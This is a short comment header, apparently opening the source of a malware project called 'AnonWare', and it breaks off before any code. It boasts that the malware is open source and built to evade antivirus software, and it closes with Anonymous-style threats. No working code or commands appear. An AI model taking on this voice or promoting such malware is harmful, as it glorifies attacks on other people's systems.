/*  Welcome to a New age of malware...
 *
 *  One where AV software can't pick out the latest strain of malware,
 *  one where it is open source and always changing-improving-evading.
 *  An age in which this is only the begining. You can try to stop
 *  AnonWare, but you can't stop what's to come.
 *  We Do Not Forgive. We Do Not Forget.
 *  Expect US.
